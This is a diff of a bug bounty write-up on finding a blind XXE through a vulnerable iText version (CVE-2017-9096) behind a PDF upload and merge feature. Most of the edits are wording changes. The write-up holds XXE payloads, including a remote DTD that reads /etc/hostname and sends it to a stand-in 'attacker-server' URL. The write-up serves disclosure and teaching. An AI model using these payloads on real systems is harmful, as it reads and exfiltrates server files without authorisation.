@@ -11,7 +11,9 @@ filename: xxe-oob-via-a-pdf-upload
 
 Hey there! My name's Manuel Valdez, I go by the handles saurinn/saur1n across different bug bounty platforms but I spend my free time hacking on intigriti, mostly. This is my first writeup so go easy on me.
 
-This article explains how I found a Blind XXE via a version of iText which was vulnerable to CVE-2017-9096. This package had been used by a Bug bounty program's stack to handle/extract text and metadata from PDF documents through a file upload feature.
+## Summary
+
+This article explains how I found a Blind XXE via a version of iText which was vulnerable to CVE-2017-9096. This package had been used by a Bug bounty program's upstream service to handle/extract text and metadata from PDF documents through a file upload feature.
 
 
 >The scope of this article does not include the definition of XXEs, sorry about that, I'm trying to make this as straightforward as I can, you know, KISS...
@@ -24,15 +26,17 @@ This article explains how I found a Blind XXE via a version of iText which was v
 
 My style of hacking is a bit feature-oriented, if I see something interesting or several moving parts working based on a particular functionality, I'm investing my time there. This time I was facing a web application that handles different documents like pictures, .xls and PDF files... Whenever I see some things going on with PDF files I'm definitely taking a look at it. 
 
-There was an upload feature that allowed certain file types: png, jpg, xls, pdf, zip and some others. Uploading images seemed totally fine, clicking on its settings did not show anything interesting either. Then I selected two images and clicked the same settings button (hamburger icon), suddenly a new option showed up: "Merge files". This option combined the two images and embedded them into a single PDF file... Can you smell that right? 
+There was an upload feature that allowed certain file types: png, jpg, xls, pdf, zip and some others. Uploading images seemed totally fine, clicking on its settings did not show anything interesting either. Then I selected two images and clicked the same settings button (hamburger icon), suddenly a new option showed up: "Merge files". This option combined the two images and embedded them into a single PDF file... 
+
+Can you smell that right? 
 
 <img src="/fish.gif" alt="kiss gif" width="800" height="300" />
 
-Like I said, images being converted to PDF files seemed pretty interesting to me, especially by taking a look at it and seeing the names of the two images inside the resulting file. 
+Like I said, images being converted to PDF files looked pretty interesting to me, especially by taking a look at it and seeing the names of the two images inside the resulting file. 
 
-At this point HTMLi to SSRF came to my mind, it's not a surprise to anyone that follows me on Twitter/X for a while that I love hunting for those but in this case it wasn't that easy <b>at first</b>. I tried a lot of tricks targeting the name of the files to get the HTML injection but what I tried didn't work, I stepped back a little bit and realized I hadn't checked the PDF metadata, classic mistake. 
+At this point HTMLi to SSRF came to my mind, it's not a surprise to anyone that follows me on Twitter/X for a while that I love hunting for those but in this case it wasn't that easy <b>at first</b>. I tried a lot of tricks targeting the name of the files to get the HTML injection but what I tried didn't work. I stepped back a little bit and realized I hadn't checked the PDF metadata, classic mistake. 
 
-By looking at the metadata some interesting strings caught me off a bit. Take a look:
+By looking at the metadata some interesting strings got my attention. Take a look:
 
 <img src="/itext.png" alt="pdf metadata" width="800" height="300" />
 
@@ -53,7 +57,7 @@ Anyway, by looking for iText vulns the first google entry pointed me to a High r
 
 ## Exploitation phase
 
-I went and followed every step, inserted a test XXE code: 
+I went and followed every step, inserted an initial XXE payload: 
 
 ```html
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://collab">]>
@@ -107,6 +111,7 @@ The <b>poc.dtd</b> file, hosted on the attacker's server, contains the actual ex
 <!ENTITY % file SYSTEM "file:///etc/hostname">
 <!ENTITY % ent "<!ENTITY data SYSTEM 'https://attacker-server/?x=%file;'>">
 ```
+
 3. `<!ENTITY % file SYSTEM "file:///etc/hostname">`: The parser reads this line from the remote DTD. It defines another parameter entity, %file, which is instructed to read the contents of the <code>/etc/hostname</code> file from the victim server's filesystem.
 
 4. `<!ENTITY % ent "<!ENTITY data SYSTEM 'https://attacker-server/?x=%file;'>">`: This is a nested entity. It defines a parameter entity %ent, whose value is the full declaration for a general entity named <b>data</b>. This part is key because it ensures the file content (%file) is read and included within the URL of the final call.
